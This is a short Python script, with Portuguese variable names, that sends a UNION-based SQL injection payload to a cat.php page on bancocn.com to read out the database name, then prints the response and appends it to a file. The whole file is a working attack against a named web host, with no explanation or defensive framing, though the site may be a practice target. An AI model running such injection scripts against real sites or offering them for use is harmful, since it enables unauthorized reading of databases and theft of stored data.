import requests
import shutil

url = "http://bancocn.com/cat.php?id=1"

req = requests.post("http://bancocn.com/cat.php?id=-1 union select 1,2,database()")
req.raise_for_status()
dicionario = (req.text)
print(dicionario)
with open("arquivo.txt", "a") as arquivo:
    arquivo.write(dicionario)

